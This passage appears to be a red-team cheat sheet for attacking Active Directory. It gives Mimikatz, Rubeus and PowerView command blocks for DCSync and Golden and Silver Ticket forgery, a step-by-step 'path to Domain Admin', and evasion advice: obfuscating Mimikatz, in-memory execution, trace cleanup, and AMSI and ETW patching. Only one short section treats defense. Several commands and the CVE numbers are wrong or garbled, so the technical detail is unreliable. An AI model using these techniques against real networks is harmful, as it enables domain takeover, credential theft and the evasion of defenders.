   - DCs are critical for DCSync and Kerberos ticket manipulation because they hold domain credentials in the **`NTDS.dit`** file and issue Kerberos tickets.
   - The script identifies DCs using `OperatingSystem -like "*Windows Server*"` and extracts their names and properties.

2. **Finding Domain Admins**:
   - Domain Admins are a prime target for **T1548 (Abuse Elevation Control Mechanism)**. The script retrieves members of the `Domain Admins` group recursively to identify potential users for exploitation.

3. **Local Admin Rights on DCs**:
   - DCs often have local admin accounts with elevated rights. The script checks for local admin privileges via `OtherAttributes` (e.g., `LocalAccountTokenFilterPolicy`), which can be exploited for lateral movement.

4. **Weak Passwords**:
   - Users with `PasswordNeverExpires` or unset `PasswordLastSet` values are vulnerable to credential theft. These users can be used to impersonate or manipulate Kerberos tickets.

5. **Misconfigured ACLs**:
   - The script checks permissions on the `NTDS` object to find users or groups with **write access** to the domain's `SYSVOL` or `NTDS.dit` files, enabling DCSync attacks.

---

### **Next Steps After Enumeration**
Once domain controllers and privileged users are identified, you can:
- Use **DCSync** to extract domain credentials via:
  ```
  # Example using BloodHound or Mimikatz for DCSync
  Invoke-DCSync -Domain

  # Import PowerView module
  Import-Module PowerView

  # Enumerate users and their properties
  Get-User -Domain domain.com -UserName *

  # Enumerate groups and members
  Get-Group -Domain domain.com -GroupName *

  # Find users with specific privileges (e.g., administrators)
  Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }

  # Enumerate Processes and Their Owners (for lateral movement)
  Get-Process -ComputerName target.com | Select-Object ProcessName, Owner

## Golden/Silver Ticket Attacks [(T1558)](https://attack.mitre.org/techniques/T1558/)
### Attack Details
A Golden Ticket is a critical post-exploitation technique used to forge Kerberos Ticket Granting Tickets (TGTs), granting individuals unlimited, near-undetectable, and persistent administrative access to an Active Directory (AD) domain. The attack is often executed using `mimikatz.exe` to extract the necessary cryptographic keys from a compromised Domain Controller (DC).
* **Note**: It is called a "Golden Ticket" because it acts as a "master key" or VIP pass to the entire network, allowing an individual to impersonate any user, including domain administrators, without needing their actual password.
## How a Golden Ticket Attack Works With Mimikatz
The attack typically occurs in several steps, usually after an individual has already gained a foothold in the target network.
### 1. Initial Compromise & Privilege Escalation
An individual breaches the network via a post-Mimikatz attack method, such as phishing, and escalates privileges until they obtain any high-privilege or Domain Admin rights or direct access to a Domain Controller.
### 2. `krbtgt` Hash Extraction
An individual may use Mimikatz to dump the NTLM password hash of the `krbtgt` account - a built-in account that signs all Kerberos tickets - from the Active Directory database (`NTDS.dit`) or LSASS process memory using a command like `lsadump::DCSync /user:DOMAIN\krbtgt`
### 3. Gathering Domain Information
The individual collects information such as Domain SID (Security Identifier) and the Fully Qualified Domain Name (FQDN).
### 4. Forging the Ticket
Using the extracted hash, the individual uses `mimikatz.exe` to generate a forged TGT, often setting the privileges to Domain Admin and extending its validity for years. A common command used is `kerberos::golden /domain:<FQDN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt`
### 5. Pass-the-Ticket (Injection)
With the `/ptt` flag (Pass-the-Ticket), Mimikatz injects the forged ticket directly into the current session memory.
### 6. Unrestricted Access
The individual now has full, legitimate-appearing access to any services, such as file servers, and databases within the compromised domain.<br>
* **🔸TL;DR**: Forging Kerberos Ticket Granting Tickets (TGT) to maintain domain administrator access.
### Tool
* Mimikatz
* **Used for**: Golden Ticket (Kerberos TGT for Domain-Wide Access)
```
# Step 1: Get krbtgt hash (requires SYSTEM privileges)  
mimikatz.exe "lsa::dump /domain"  

# Step 2: Create a Golden Ticket (using krbtgt hash)  
mimikatz.exe "kerberos::golden /domain:example.com /user:Administrator /id:500 /password:Secretpass123 /sid:S-1-5-21-... /target:target.com /ticket:golden_ticket.kirbi"  

# Step 3: Load the Golden Ticket into memory  
mimikatz.exe "kerberos::ptt golden_ticket.kirbi"  

# Step 4: Use the ticket to access resources (e.g., log in as Administrator)  
mimikatz.exe "ts::login /user:Administrator /domain:example.com"
```
### Tool
* Mimikatz
* **Used for**: Silver Ticket (Kerberos Service Ticket for Constrained Delegation)
```
# Step 1: Get service account hash (e.g., from lsass or Kerberos ticket)  
mimikatz.exe "sekurlsa::hashes /process"  

# Step 2: Create a Silver Ticket (using service account hash)  
mimikatz.exe "kerberos::silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com"  

# Step 3: Load the Silver Ticket into memory  
mimikatz.exe "kerberos::ptt silver_ticket.kirbi"  

# Step 4: Use the ticket to access the service (e.g., HTTP)  
mimikatz.exe "ts::login /user:serviceAccount /domain:example.com"
```
### Tool
* Rubeus - Golden & Silver Tickets
* **Used for**: Golden Ticket (Kerberos TGT) Attacks known for, strenght weak
```
# Step 1: Request a Golden Ticket (using domain credentials)  
Rubeus.exe golden /user:Administrator /password:Secretpass123 /domain:example.com /sid:S-1-5-21-... /target:target.com  

# Step 2: Use the Golden Ticket to impersonate a user  
Rubeus.exe ptt /ticket:golden_ticket.kirbi  

# Step 3: Access a resource with the impersonated ticket  
Rubeus.exe kerberos::ticket /ticket:golden_ticket.kirbi /s:target.com
```
### Tool
* Rubeus
* **Used for**: Silver Ticket (Kerberos Service Ticket) Attacks
```
# Step 1: Request a Silver Ticket (using service account credentials)  
Rubeus.exe silver /service:HTTP/target.com /user:serviceAccount /password:Secretpass123 /domain:example.com /dc:domain.com  

# Step 2: Use the Silver Ticket to access the service  
Rubeus.exe ptt /ticket:silver_ticket.kirbi  

# Step 3: Access the service (e.g., HTTP) with the ticket  
Rubeus.exe kerberos::ticket /ticket:silver_ticket.kirbi /s:target.com
```
### Tool
* PowerView - Enumeration for Ticket Attacks
* **Used for**: Golden Ticket (Identify Target for Impersonation)
```
# Step 1: Enumerate domain users (including administrators)  
Import-Module PowerView  
Get-User -Domain example.com | Where-Object { $_.UserAccountControl -band 16777216 }  

# Step 2: Find service accounts or SPNs for Silver Ticket targets  
Get-SPN -Domain example.com | Select-Object -ExpandProperty SPN  
```
### Tool
* PowerView
* **Used for**: Silver Ticket (Identify Service Targets)
```
# Step 1: Enumerate all services (SPNs) in the domain  
Get-SPN -Domain example.com  

# Step 2: Find users with specific privileges (e.g., for Golden Ticket)  
Get-ADObject -Filter {objectClass -eq "user"} -Properties * | Where-Object { $_.userAccountControl -band 16777216 }  
```
## Privilege Escalation [(TA0004)](https://attack.mitre.org/techniques/TA0004/)
* **Abuse Elevation Control Mechanism (T1548)**: Leveraging UAC bypass, Token Manipulation, or misconfigured Access Control Lists (ACLs).
### Tool
* PowerUp
* BloodHound

## Actionable Mitigation and Defense Strategies
### Hardening (Prevention)
* **Disable Legacy Protocols**: Disable SMBv1, LLMNR, and restrict NTLMv1.
* **Credential Protection**: Implement Credential Guard, LAPS (Local Administrator Password Solution) for local admin accounts.
* **Tiered Administration**: Implement a Tiered Admin Model to restrict high-privilege accounts from lower-tier workstations.
* **AD CS Security**: Audit and harden AD Certificate Services to prevent forgery.

## Monitoring (Detection)
* **SIEM/Audit Logs**: Monitor for Event ID 4624 (successful login), 4688 (process creation), and 4720-4730 (user/group management).
* **Detection Rules**: Create alerts for `ntds.dit` file access, unusual service creation (`PsExec`), and modification of sensitive group memberships (e.g., Domain Admins).
* **Simulation**: Use tools like Caldera or Infection Monkey to simulate techniques like DCSync (T1003.006) to test detection efficacy. 

## Offensive Security Best Practices & Blue Team Advice
### Tools Do's and Don'ts
* **Do**: Use legitimate administrative tools (Living off the Land) to avoid signature detection (e.g., PowerShell, WMI).
* **Don't**: Run tools like Mimikatz without renaming or obfuscating the executable, as it is highly signatured.
### Avoiding Blue Team Obstacles:
* **Operational Security (OPSEC)**: Avoid noisy scans. Use SharpHound with specific collection methods rather than All.
* **Living off the Land**: Use `net.exe`, `dsquery`, or native PowerShell cmdlets to reduce the forensic footprint.
* **Targeted Enumeration**: Use BloodHound to identify the shortest, least noisy attack path to Domain Admin, rather than trying to attack every object. 

## Core Active Directory TTPs
Active Directory attacks typically span four major Tactics: Credential Access, Discovery, Lateral Movement, and Persistence.
### Credential Access
* **Kerberoasting [(T1558.003)](https://attack.mitre.org/techniques/T1558/003/)**: Requesting Service Tickets (TGS) for service accounts and cracking them offline.
* **AS-REP Roasting [(T1558.004)](https://attack.mitre.org/techniques/T1558/004/)**: Targeting accounts with 'Do not require Kerberos pre-authentication" enabled to crack their passwords.
* **`NTDS.dit` Dumping [(T1003.003)](https://attack.mitre.org/techniques/T1003/003/)**: Stealing the primary AD database file from a Domain Controller to extract all user hashes.
* **Pass-the-Hash (PtH) [(T1550.002)](https://attack.mitre.org/techniques/T1550/002/)**: Using a captured NTLM hash to authenticate without needing the plaintext password.
* **Pass-the-Ticket (PtT) [(T1550.003)](https://attack.mitre.org/techniques/T1550/003/)**: Using captured Kerberos tickets (TGT/TGS) to move across the domain.

## Discovery
* **Domain Trust Discovery [(T1482)](https://attack.mitre.org/techniques/T1482/)**: Using tools like AdFind or BloodHound to map relationships between domains and forests.
* **Account Discovery [(T1087.002)](https://attack.mitre.org/techniques/T1087/002/)**: Enumerating domain accounts via LDAP queries or native tools like `net user /domain`.
* **Permission Groups Discovery [(T1069.002)](https://attack.mitre.org/techniques/T069/002/)**: Identifying high-value groups like Domain Admins or Enterprise Admins.
* **Domain Controller Discovery [(T1018)](https://attack.mitre.org/techniques/T1018/)**: Locating Domain Controllers via DNS or `nltest`.

## Lateral Movement & Persistence
* **Golden Ticket [(T1558.001)](https://attack.mitre.org/techniques/T1558/001/)**: Forging a Ticket Granting Ticket (TGT) using the `krbtgt` account hash for permanent domain-wide access.
* **Silver Ticket [(T1558.002)](https://attack.mitre.org/techniques/T1558/002/)**: Forging service tickets to gain unauthorized access to specific services (e.g., MSSQL, CIFS).
* **DCShadow [(T1207)](https://attack.mitre.org/techniques/T1207/)**: Registering a rogue Domain Controller to inject malicious objects or change permissions.
* **DCSync [(T1003.006)](https://attack.mitre.org/techniques/T1003/006/)**: Impersonating a Domain Controller to request account hashes from another DC via replication protocols.

## Active Directory CS (Certificate Services)
Exploiting AD CS is currently one of the most effective ways to escalate privileges from a standard user to Domain Admin.
* **ADCS ESC1/ESC2/ESC3 [(T1649)](https://attack.mitre.org/techniques/T1649/)**: Misconfigured Certificate Templates.
Requesting a certificate for a high-privileged user (like a Domain Admin) using a low-privileged account.
* **AD CS ESC8 [(T1557.001)](https://attack.mitre.org/techniques/T1557/001/)**: NTLM Relay to HTTP Enrollment options.
Coercing a Domain Controller to authenticate to an attacker machine, then relaying that to the AD CS web interface to get a DC certificate.
* **Certificate Theft [(T1552.004)](https://attack.mitre.org/techniques/T1552/004/)**: Exporting private keys and certificates from user stores to bypass MFA or impersonate identities.

## Delegation & Relationship Attacks
Active Directory (AD) delegation and relationship attacks exploit inherent trust, misconfigurations, and legitimate functionality within Windows domain environments (also referred to as Living Off The Land (LOTL)) to elevate privileges, move laterally, and pivot. **Delegation attacks** leverage the ability of a service to impersonate a user to access other services, while **relationship attacks** exploit excessive or unintended Access Control List (ACL) permissions between objects (users, groups, computers) in an AD domain.
### Unconstrained Delegation [(T1558)](https://attack.mitre.org/techniques/T1558/)
Unconstrained Delegation occurs when a compromised server allows an attacker to intercept the Ticket Granting Ticket (TGT) of a high-privileged user who connects to it. Once the TGT is stored in memory (LSASS), it can be extracted and used immediately for impersonation or taken offline for cracking, providing a direct path to full domain compromise.
### Constrained Delegation
### C[(T1558.003)](https://attack.mitre.org/techniques/T1558/003)
Constrained Delegation exploits the `msDS-AllowedToDelegateTo` attribute, which specifies the backend services a service account can impersonate users to. By compromising an account with this privilege, an attacker can leverage the Service-for-User (S4U) extensions to generate a valid service ticket for any user—including high-privileged administrators—without their interaction, granting unauthorized access to the restricted target service.
### Resource-Based Constrained Delegation (RBCD) [(T1558)](https://attack.mitre.org/techniques/T1558/)
Configuring a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow an attacker-controlled machine to impersonate users to it.
* **Group Policy Object (GPO) Abuse [(T1484.001)](https://attack.mitre.org/techniques/T1484.001/)
Group Policy Object (GPO) Abuse leverages unauthorized write access to a GPO to deploy malicious configurations across a fleet of domain-joined systems. By modifying high-impact settings—such as adding scheduled tasks, pushing malicious scripts via startup/shutdown policies, or injecting new accounts into the local Administrators group—an attacker can achieve automated, large-scale code execution and persistent administrative control over all workstations or servers within the linked Organizational Unit (OU).

## Manipulation & Impersonation
* **SAM Name Spoofing / NoPac (T1558)**: Exploiting logic flaws (CVE-2012-42278/42287) where a machine account name is changed to match a Domain Controller, tricking the KDC into issuing a high-privileged TGT.
* **ACL/ACE Modification (T1098)**: Adding `GenericAll` or `WriteDacl` permissions to a target object (like a User or Group) to ensure long-term control.
* **`AdminSDHolder` (T1098)**: Modifying the permissions of the `AdminSDHolder` container. AD automatically propagates these permissions to protected groups (like Domain Admins) every 60 minutes.

## Network & Protocol Attacks (In-Network)
* **LLMNR/NBT-NS Poisoning (T1557.001)**: Using tools like Responder to spoof name resolution responses and capture NTLMv2 hashes from the network.
* **IPv6 DNS Takeover / `mitm6` (T1557.001)**: Acting as a rogue IPv6 DNS server to force Windows machines to authenticate via WPAD, allowing for NTLM relaying.
* **Remote Service Creation (T1543.003)**: Using `PsExec` or `sc.exe` to create services on remote machines once local admin rights are obtained. 

## Red Team Execution: Path to Domain Admin

### 1. Initial Access & Credential Capture
#### TTPs:
* LLMNR/NBT-NS Poisoning (T1557.001)
* Spearphishing (T1566.001)
#### Primary Tools:
* **Responder**: Captures NTLMv1/v2 hashes via protocol poisoning.
* **Inveigh**: A PowerShell/C# version of Responder (better for Windows-only environments).
* **Evilginx2**: For MFA-bypass phishing.
#### Evasive Techniques:
* **Analyze Network Traffic First***: Run Responder in "Analyze" mode (`-A`) to identify noise before poisoning.
* **Targeted Poisoning**: Use the `-I` flag to target specific IP ranges rather than the targeting the entire subnet which will set off detection alarms.
* **Socket Selection**: Use `Inveigh` to avoid opening new high-risk ports that EDR monitors.

### 2. Reconnaissance
#### TTPs:
* Domain Trust / Object Discovery (T1482)
#### Primary Tools:
* **BloodHound / SharpHound**: Maps the "Six Degrees of Domain Admin."
* **AdFind**: Command-line tool for specific LDAP queries.
* **Snaffler**: Finds sensitive data in AD (passwords, certificates) in open shares.
#### Evasive Techniques:
* **Stealthy Collection**: Use `SharpHound` with the `--collectionmethod DCOnly` or `LogonSessions` to avoid touching every workstation.
* **Slow & Steady**: Use the `--throttling` and `--jitter` flags to bypass behavior-based detection of massive LDAP queries.
* **DON'T USE `.exe`**: Run SharpHound via In-Memory Reflection using `execute-assembly` in your C2 (Cobalt Strike, or Havoc).

### 3. Privilege Escalation
#### TTPs:
* Kerberoasting (T1558.003)
* AD CS ESC1 (T1649)
### Primary Tools:
* **Rubeus**: The industry standard for AD Kerberos interactions.
* **Certipy / Certify**: For identifying and exploiting AD CS misconfigurations.
* **Impacket Tool Suite's (`GetUserSPNs.py`)**: For remote Kerberoasting from a *nix attack box.
#### Evasive Techniques:
* **Targeted Roasting**: **Do not roast every SPN**. Only request tickets for accounts with high-privilege keywords (e.g., `*adm*`, `*svc*`, `*sql*`).
* **Encryption Downgrading**: Avoid forcing weak encryption (RC4) if the targeted domain supports AES, or RC-4 only requests are high-fidelity alerts.
* **OPSEC-Safe AD CS**: Use `Certify` to find templates but avoid the `/enforce` flag unless absolutely necessary to prevent accidental lockouts or alerts from triggering.

### 4. Lateral Movement
#### TTPs:
* Overpass-the-Hash / Pass-the-Ticket (PtT)
### Primary Tools:
* **Mimikatz**: The classic tool for credential extraction and injection.
* **Impacket Tool Suite (`wmiexec.py` / `PSExec.py`)**: For executing commands on remote targets.
* **Evil-WinRM**: For remote management access using captured credentials.
#### Evasive Techniques:
* **Avoid Mimikatz on Disk**: **Always run it via memory** or use LSASS Minidumps (e.g., `comsvcs.dll` via `rundll32`) to avoid signature detection.
* **WMI over SMB**: Use `wmiexec` or `dcomexec` instead of `psexec`, as `psexec` creates a visible service that EDRs will flag instantly.
* **SOCKS Proxying**: Use `Chisel` or `Ligolo-ng` to tunnel Impacket traffic through your C2 agent to appear as inconspicuous local network traffic.

### 5. Persistence
#### TTPs:
* Golden Ticket (T1558.001)
* GPO Modification (T1484.001)
#### Primary Tools:
* **Mimikatz (`lsadump::lsa /patch`)**: To extract the `krbtgt` hash.
* **`SharpGPOAbuse`**: For adding malicious tasks or rights to GPOs.
* **`PyGPOTools`**: For remote GPO abuse and manipulation.
#### Evasive Techniques:
* **`krbtgt` Rotation**: If you create a Golden Ticket, ensure its lifetime is short (e.g., 10 hours) to match normal domain policy and avoid setting off any file mismatch alerts.
* **GPO "Hidden" Tasks**: When modifying GPOs, use an existing, legitimate GPO and add a "hidden" scheduled task that only triggers on specific conditions.
* **DCSync Timing**: When running `DCSync` to get the `krbtgt` hash, target a specific DC that is known for higher traffic to blend in with replication and background 'network noise.'

### Quick Red Team Tool Breakdown
| Attack Phase | Tool(s) | MITRE ID |
| -------- | -------- | -------- |
| Initial Capture    | [Responder](https://www.kali.org/tools/responder/), [Inveigh](https://github.com/kevin-robertson/inveigh)     | [T1557.001](https://attack.mitre.org/techniques/T1557/001/)     
| Mapping    | [BloodHound](https://www.kali.org/tools/bloodhound)/, [SharpHound](https://github.com/SpecterOps/SharpHound)     | [T1482](https://attack.mitre.org/techniques/T1482/)     
| Kerberos Exploits    | [Rubeus](https://www.kali.org/tools/rubeus/), [Impacket](https://www.kali.org/tools/impacket/)     | [T1558](https://attack.mitre.org/techniques/T1558/)     
| AD CS Exploits    | [Certipy](https://github.com/ly4k/Certipy), [Certify](https://github.com/GhostPack/Certify)     | [T1649](https://attack.mitre.org/techniques/T1649/)     |
| Movement    | [Mimikatz](https://www.kali.org/tools/mimikatz/), [WMIexec](https://github.com/XiaoliChan/wmiexec-Pro)     | [T1550](https://attack.mitre.org/techniques/T1550/)     |
| Persistence    | [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse), [Mimikatz](https://www.kali.org/tools/mimikatz/)     | [T1484](https://attack.mitre.org/techniques/T1484/)    

### 6. Coerced Authentication & NTLM Relaying
These techniques allow an individual to move laterally and escalate privileges without ever needing to crack a password or find a plaintext credential.
### TTPs:
* **Adversary-in-the-Middle (AitM) (T1557.001)**: Adversary-in-the-Middle (AitM) is a specific cybersecurity sub-technique within the MITRE ATT&CK® framework where an attacker poisons themselves between a user and a legitimate network resource to intercept and manipulates authentication traffic. By exploiting weak network protocols (LLMNR, NBT-NS, mDNS), attackers are able to trick systems into sending authentication hashes to the attacker-controlled machine, which are then relayed to other services to gain unauthorized access.
* **Exploitation of Remote Services (T1210)**: This involves forcing a high-privileged machine (like a Domain Controller) to authenticate to you, then "relaying" that session to a target (like AD CS or a sensitive, mission-critical server).
### Primary Tools:
* **PetitPotam/SpoolSample**: Coerces a machine account to authenticate via MS-EFSR or Print Spooler.
* **Impacket Tool Suite (`ntlmrelayx`)**: The "engine" that catches the authentication and relays it to LDAP, SMB, or HTTP.
* **PrinterBug**: Specifically targets the Print System Remote Protocol to force authentication.
### Evasive Techniques:
* **Relay to LDAP/S**: Many EDRs monitor SMB relaying. Relaying NTLM to LDAP (to modify permissions) or AD CS (to get a certificate) is often less scrutinized.
* **Multi-Relay**: Use `--multi-relay` in `ntlmrelayx` to maintain a persistent relay session across multiple targets simultaneously.

### 7. Shadow Credentials (Whiteshadow)
### TTPs:
* **Account Manipulation (T1098)**: If you have "`GenericWrite`" or "`WriteProperty`" over a user or computer object, you can add a public key to their `msDS-KeyCredentialLink` attribute and then authenticate as them via PKINIT.
### Primary Tools:
* **Whisker / `pyWhisker`**: Specifically designed to manipulate the `msDS-KeyCredentialLink` attribute.
* **Rubeus**: Used to perform the subsequent PKINIT authentication to get a TGT.
### Evasive Techniques:
* **Attribute Cleanup**: This technique leaves a permanent attribute on the object. Always remove the key link immediately after obtaining your TGT to minimize the forensic footprint.
* **Targeting "Dead" Accounts**: Apply shadow credentials to accounts that are rarely used but have high permissions to avoid triggering "active session" alerts.

### 8. Local Privilege Escalation (LPE) to Domain Access
### TTPs:
* **Access Token Manipulation (T1134)**: Access Token Manipulation (T1134) is a MITRE ATT&CK® technique used by adversaries to gain unauthorized access to systems, escalate privileges, and evade security controls by manipulating the Windows security tokens that are associated with processes and threads. This technique primarily targets Windows environments, allowing an attacker to change the security context of a running process to appear as if it is running as a different user (e.g., Administrator or `NT AUTHORITY\SYSTEM`).
* **Boot or Logon Autostart Execution (T1547)**: Boot or Logon AutoStart Execution (T1547) is a MITRE ATT&CK® technique where attackers configure malicious programs to run automatically when a system boots or a user logs in. By abusing system startup mechanisms like registry keys, startup folders, or `systemd`, they achieve persistence, privilege escalation, and stealth.
### Primary Tools:
* **SharpUp / Seatbelt**: Audits for local misconfigurations (unquoted service paths, modifiable binaries).
* **GodPotato / PetitPotato**: Modern "Potato" exploits to escalate from Service Accounts to `SYSTEM`.
* **Mimikatz (`sekurlsa::tickets`)**: To "harvest" tickets of users currently or previously logged into the machine.
### Evasive Techniques:
* **Process Injection**: Instead of running an exploit as a new process, inject your LPE code into a trusted process like `svchost.exe` or `spoolsv.exe`.
* **Token Impersonation**: Use `incognito` (via Metasploit/Cobalt Strike) to steal tokens from memory without dumping LSASS, which is a massive EDR trigger.

### 9. The "Golden GMSA" Attack
### TTPs: Steal or Forge Kerberos Tickets (T1558)
* Group Managed Service Accounts (gMSAs) are often used for high-privilege services. If you can read the `msDS-ManagedPassword` attribute, you own the service.
### Primary Tools:
* **`GMSAPasswordReader`**: Specifically for extracting gMSA passwords.
* **BloodHound**: To identify which users have the rights to read gMSA passwords.
### Evasive Techniques
* **LDAP Filtering**: Use targeted LDAP filters to read only the specific gMSA attribute you need, rather than querying the entire object, which might trigger behavioral alerts.
### Red Team TTP Mapping Table
| Attack Phase | Technique(s) | MITRE TTP | Tool(s) |
| -------- | -------- | -------- | -------- |
| Initial     | Coerced Authentication     | T1210    | PetitPotam     | 
| Escalation     | Shadow Credentials     | T1098    | Whisker     |
| Recon     | gMSA Discovery     | T1087.002    | BloodHound     |
| Movement     | Token Impersonation     | T1134    | Incognito     |
| Persistence     | Golden Certificate     | T1558.001    | ForgeCert     |

## Technical Deep-Dive Into Evasion and Tool Command Syntax
### 1. Detection Evasion Deep-Dive (AMSI & ETW)
* Modern EDRs rely on AMSI to scan memory and ETW to log suspicious API calls (like OpenProcess on LSASS).
Bypassing AMSI (Antimalware Scan Interface):
* **Patching**: Overwrite the AmsiScanBuffer function in `amsi.dll` with a "return" (`0xCB`) so it always returns "Clean."
* **Obfuscation**: Use tools like Chimera or `Invoke-Obfuscation` to change variable names and string types in PowerShell scripts.
* **Bypassing ETW (Event Tracing for Windows) - ETW Patching**: Similar to AMSI, you can patch `EtwEventWrite` in `ntdll.dll` to prevent the OS from sending telemetry to the EDR.
* **Unhooking**: Use `LdrBuiltin` or SharpBlock to load a "fresh" copy of ntdll.dll from disk, effectively removing the EDR's hooks.
<!-- Optional -->
<!-- ## License -->
<!-- This project is open source and available under the [... License](). -->

<!-- You don't have to include all sections - just the one's relevant to your project -->
